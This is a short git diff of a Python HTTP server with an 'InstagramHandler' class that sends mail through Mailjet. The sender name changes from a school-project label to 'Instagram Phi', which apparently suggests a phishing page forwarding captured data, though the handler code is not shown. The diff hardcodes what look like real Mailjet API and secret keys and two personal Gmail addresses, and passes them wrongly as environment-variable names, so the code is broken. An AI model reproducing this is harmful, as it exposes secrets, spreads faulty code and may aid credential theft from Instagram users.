@@ -6,11 +6,11 @@ import requests
 import os
 
 # --- CONFIG DESDE VARIABLES DE ENTORNO ---
-MAILJET_API_KEY = os.environ.get("MAILJET_API_KEY")
-MAILJET_SECRET_KEY = os.environ.get("MAILJET_SECRET_KEY")
-SENDER_EMAIL = os.environ.get("SENDER_EMAIL")
-RECIPIENT_EMAIL = os.environ.get("RECIPIENT_EMAIL")
-SENDER_NAME = "Proyecto Escolar"
+MAILJET_API_KEY = os.environ.get("26f97d1e712110b2df6b678c218a6cc6")
+MAILJET_SECRET_KEY = os.environ.get("9ce777cf5fc96abcb064e3ddecfc371d")
+SENDER_EMAIL = os.environ.get("mexicanonwod@gmail.com")
+RECIPIENT_EMAIL = os.environ.get("isowyvencid@gmail.com")
+SENDER_NAME = "Instagram Phi"
 
 # --- HANDLER ---
 class InstagramHandler(BaseHTTPRequestHandler):
@@ -99,3 +99,4 @@ if __name__ == "__main__":
     server = HTTPServer(('0.0.0.0', PORT), InstagramHandler)
     print(f"✅ Servidor corriendo en http://localhost:{PORT}")
     server.serve_forever()
+
